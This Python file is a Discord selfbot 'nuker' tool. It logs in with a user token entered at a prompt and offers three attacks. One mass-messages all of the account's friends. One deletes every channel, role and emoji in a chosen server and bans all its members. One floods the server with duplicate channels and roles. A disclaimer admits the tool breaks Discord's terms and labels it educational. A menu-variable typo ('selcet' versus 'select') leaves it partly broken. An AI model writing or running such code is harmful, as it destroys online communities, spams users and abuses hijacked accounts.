import discord
from discord.ext import commands
import colorama 
import os
from colorama import Fore
import time
import getpass
import asyncio
# imports all the stuff you'll need
client = discord.Client()
print("DISCLAIMER:")
time.sleep(0.5)
print(f"Client modification and spamming messages  are {Fore.LIGHTYELLOW_EX}against Discord's TOS!!{Fore.RESET}")
time.sleep(0.8)
print("Use this tool only for educational purposes and at your own risk")
time.sleep(0.8)
print("Ask the server owner if you're allowed to use this tool")
time.sleep(0.8)
print(f"Booting {Fore.RED}长闩尺ㄩ爪闩 {Fore.RESET}Bot")
time.sleep(0.4)
print(f"{Fore.RED}25%")
time.sleep(0.6)
print(f"{Fore.YELLOW}50%")
time.sleep(0.7)
print(f"{Fore.LIGHTYELLOW_EX}75%")
time.sleep(0.8)
print(f"{Fore.GREEN}99%")
time.sleep(1.1)
print(f"{Fore.LIGHTBLUE_EX}长闩尺ㄩ爪闩 Bot booted")
time.sleep(1)
#little disclaimer

token = getpass.getpass("Input Token(input is invisible)>>") #getpass makes your input invisible
async def Nuke(): #nuke part of the code
    print(f'{Fore.LIGHTYELLOW_EX}------')
    print('Nuke was selected')
    while True:
        try:
            server_id = int(input('Enter the server ID: '))
            break
        except ValueError:
            print(f'{Fore.RED}Invalid option😅')
            continue
    print(f'{Fore.LIGHTYELLOW_EX}------')
    for guild in client.guilds:
        if guild.id == server_id:
            print('Discord server "{}" was selected as a target...'.format(guild.name))
            print('------')
            print('Before we start, is there a ban reason? (Leave blank for no reason)')
            ban_reason = input('Enter ban reason: ')
            print('------')
            for channel in guild.channels:
                try:
                  await channel.delete()
                  print(f"{Fore.GREEN}[+] [CHANNEL DELETED] {channel.name} in '{guild.name}'")
                  await asyncio.sleep(0.5)
                except:
                  print(f"{Fore.RED}[-] [CHANNEL NOT DELETED] {channel.name} in '{guild.name}'")
            for role in guild.roles:
                try:
                  await role.delete()
                  print(f"{Fore.GREEN}[+] [ROLE DELETED] {role.name} in '{guild.name}'")
                  await asyncio.sleep(0.5)
                except:
                   print(f"{Fore.RED}[-] [ROLE NOT DELETED] {role.name} in '{guild.name}'")
            for user in guild.members:             
                try:
                  await guild.ban(user, reason=ban_reason, delete_message_days=7)
                  print(f"{Fore.GREEN}[+] [BANNED] {user.name} (ID: {user.id}) in '{guild.name}'")
                  await asyncio.sleep(0.5)
                except:
                   print(f"{Fore.RED}[-] [FAIL BAN] {user.name} (ID: {user.id}) in '{guild.name}'")
            for emoji in guild.emojis:
                print(emoji)
                try:
                    await emoji.delete()
                    print(f"{Fore.GREEN}[+] [EMOJI DELETED] {emoji.name} in '{guild.name}'")
                    await asyncio.sleep(0.5)
                except:
                    print(f"{Fore.RED}[-] [EMOJI NOT DELETED] {emoji.name} in '{guild.name}'")
            print(f'{Fore.GREEN}⚡All tasks completed⚡')
            print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩")
            time.sleep(1)
            raise SystemExit


def exit(): # exit part of the code
  print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
  time.sleep(5)
  raise SystemExit

async def raid(): # raid part of the code
  print('Raid was selected')
  while True:
    try:
        server_id = int(input('Enter the server ID: '))
        break
    except ValueError:
        print(f'{Fore.RED}Invalid option😅')
        continue
  print(f'{Fore.LIGHTYELLOW_EX}------')
  for guild in client.guilds:
    if guild.id == server_id:
      print('Discord server "{}" was selected as a target...'.format(guild.name))
      print('------')
      servername = input(f"{Fore.GREEN}Please enter a guild name>> ")
      role = input(f"{Fore.GREEN}Please enter a role name>> ")
      text_channel = input(f"{Fore.GREEN}Please enter a text channel name>> ")
      await guild.edit(name=servername)
      print(f"[+]Renamed the guild to: {servername}")
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_text_channel(text_channel)
      print(f"{Fore.GREEN}[+]Created a text channel: {text_channel}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)      
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)
      await guild.create_role(name=role)
      print(f"{Fore.GREEN}[+]Created a role: {role}")
      await asyncio.sleep(0.5)  
  print(f'{Fore.GREEN}⚡All tasks completed⚡') 
  print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
  time.sleep(5)
  raise SystemExit 

@client.event
async def on_ready():# on ready event
  print(f'''
{Fore.CYAN}██{Fore.WHITE}╗ {Fore.CYAN} ██{Fore.WHITE}╗ {Fore.CYAN}█████{Fore.WHITE}╗ {Fore.CYAN}██████{Fore.WHITE}╗ {Fore.CYAN}██{Fore.WHITE}╗   {Fore.CYAN}██{Fore.WHITE}╗{Fore.CYAN}███{Fore.WHITE}╗   {Fore.CYAN}███{Fore.WHITE}╗ {Fore.CYAN}█████{Fore.WHITE}╗
{Fore.CYAN}██{Fore.WHITE}║ {Fore.CYAN}██{Fore.WHITE}╔╝{Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}╗{Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}╗{Fore.CYAN}██{Fore.WHITE}║   {Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}████{Fore.WHITE}╗ {Fore.CYAN}████{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}╗
{Fore.CYAN}█████{Fore.WHITE}═╝ {Fore.CYAN}███████{Fore.WHITE}║{Fore.CYAN}██████{Fore.WHITE}╔╝{Fore.CYAN}██{Fore.WHITE}║   {Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}╔{Fore.CYAN}████{Fore.WHITE}╔{Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}███████{Fore.WHITE}║
{Fore.CYAN}██{Fore.WHITE}╔═{Fore.CYAN}██{Fore.WHITE}╗ {Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}╗{Fore.CYAN}██{Fore.WHITE}║   {Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}║╚{Fore.CYAN}██{Fore.WHITE}╔╝{Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}╔══{Fore.CYAN}██{Fore.WHITE}║
{Fore.CYAN}██{Fore.WHITE}║ ╚{Fore.CYAN}██{Fore.WHITE}╗{Fore.CYAN}██{Fore.WHITE}║  {Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}║  {Fore.CYAN}██{Fore.WHITE}║╚{Fore.CYAN}██████{Fore.WHITE}╔╝{Fore.CYAN}██{Fore.WHITE}║ ╚═╝ {Fore.CYAN}██{Fore.WHITE}║{Fore.CYAN}██{Fore.WHITE}║  {Fore.CYAN}██{Fore.WHITE}║
{Fore.CYAN}{Fore.WHITE}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
{Fore.WHITE}                                 Made by {Fore.YELLOW}hoemotion              
{Fore.GREEN}Logged in as {Fore.YELLOW}"{client.user.name}" {Fore.GREEN}(ID:{Fore.YELLOW} {client.user.id}{Fore.GREEN})
[1] Mass Dm friends 
[2] Nuke
[3] Raid
[4] Exit the script

''')
  selcet = input(f"{Fore.GREEN}Select>> ")
  if select == '1':
   input2 = input(f"Mass Dm friends was selected\n{Fore.GREEN}What Should I Send?>> ")
   for user in client.user.friends:
       try:
          await user.send(f"{input2}")
          print(f"{Fore.GREEN}[+] Sent{Fore.WHITE} {input2} {Fore.GREEN}to {Fore.YELLOW}{user}")
          await asyncio.sleep(0.5)
       except:
          print("Something went wrong")
   print('⚡All tasks completed⚡')
   print(f"{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nthe script will automaticly close in 5 seconds")
   time.sleep(5)
   raise SystemExit
  elif select == '2':
   await Nuke()
  elif select == '4':
    await exit()
  elif select == '3':
    await raid()
   

client.run(token, bot = False)
